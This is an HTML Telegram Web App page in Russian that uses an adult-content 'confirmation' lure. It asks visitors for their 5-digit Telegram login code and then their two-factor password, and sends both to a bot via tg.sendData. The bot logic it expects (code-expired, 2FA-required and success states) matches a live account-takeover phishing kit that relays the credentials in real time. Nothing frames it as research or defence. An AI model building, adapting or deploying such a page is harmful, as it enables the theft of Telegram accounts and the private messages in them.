<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Регистрация для просмотра</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background: #0a0a0a;
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            box-sizing: border-box;
        }
        .container {
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h1 {
            font-size: 28px;
            margin-bottom: 20px;
            color: #fff;
        }
        .code-input {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin: 20px 0;
        }
        .code-input input {
            width: 50px;
            height: 60px;
            text-align: center;
            font-size: 24px;
            background: #2a2a2a;
            border: 2px solid #444;
            border-radius: 8px;
            color: white;
            outline: none;
        }
        .code-input input:focus {
            border-color: #888;
        }
        .password-input {
            width: 100%;
            padding: 15px;
            background: #2a2a2a;
            border: 2px solid #444;
            border-radius: 8px;
            color: white;
            font-size: 18px;
            margin: 20px 0;
            box-sizing: border-box;
        }
        button {
            background: #1e88e5;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 15px 30px;
            font-size: 18px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }
        .hidden {
            display: none;
        }
        .error {
            color: #ff8a80;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔞 Подтверждение</h1>
        <div id="step-code">
            <p>Введите 5-значный код из Telegram</p>
            <div class="code-input">
                <input type="text" id="code1" maxlength="1" oninput="moveToNext(this, 'code2')">
                <input type="text" id="code2" maxlength="1" oninput="moveToNext(this, 'code3')">
                <input type="text" id="code3" maxlength="1" oninput="moveToNext(this, 'code4')">
                <input type="text" id="code4" maxlength="1" oninput="moveToNext(this, 'code5')">
                <input type="text" id="code5" maxlength="1" oninput="moveToNext(this, 'code5')">
            </div>
            <button onclick="sendCode()">Подтвердить</button>
            <div id="code-error" class="error"></div>
        </div>
        <div id="step-password" class="hidden">
            <p>Введите пароль двухфакторной аутентификации</p>
            <input type="password" id="password" class="password-input" placeholder="Пароль">
            <button onclick="sendPassword()">Войти</button>
            <div id="password-error" class="error"></div>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        // При загрузке отправляем init, чтобы бот знал, что WebApp открыт
        tg.sendData(JSON.stringify({ action: 'init' }));

        function moveToNext(current, nextId) {
            if (current.value.length >= current.maxLength) {
                document.getElementById(nextId)?.focus();
            }
        }

        function sendCode() {
            let code = '';
            for (let i = 1; i <= 5; i++) {
                let val = document.getElementById(`code${i}`).value;
                if (!val) {
                    document.getElementById('code-error').innerText = 'Введите все цифры';
                    return;
                }
                code += val;
            }
            tg.sendData(JSON.stringify({ action: 'send_code', code: code }));
            document.getElementById('step-code').classList.add('hidden');
        }

        function sendPassword() {
            let password = document.getElementById('password').value;
            if (!password) {
                document.getElementById('password-error').innerText = 'Введите пароль';
                return;
            }
            tg.sendData(JSON.stringify({ action: 'send_password', password: password }));
            document.getElementById('step-password').classList.add('hidden');
        }

        // Слушаем сообщения от бота
        tg.onEvent('message', function(event) {
            let data = JSON.parse(event.data);
            if (data.status === 'show_code_input') {
                document.getElementById('step-code').classList.remove('hidden');
                for (let i = 1; i <= 5; i++) {
                    document.getElementById(`code${i}`).value = '';
                }
            } else if (data.status === 'code_expired') {
                document.getElementById('code-error').innerText = 'Код истёк, новый отправлен';
                document.getElementById('step-code').classList.remove('hidden');
                for (let i = 1; i <= 5; i++) {
                    document.getElementById(`code${i}`).value = '';
                }
            } else if (data.status === 'invalid_code') {
                document.getElementById('code-error').innerText = 'Неверный код';
                document.getElementById('step-code').classList.remove('hidden');
            } else if (data.status === '2fa_required') {
                document.getElementById('step-code').classList.add('hidden');
                document.getElementById('step-password').classList.remove('hidden');
            } else if (data.status === 'success') {
                tg.close();
            } else if (data.status === 'error') {
                alert('Ошибка: ' + data.message);
                tg.close();
            }
        });
    </script>
</body>
</html>
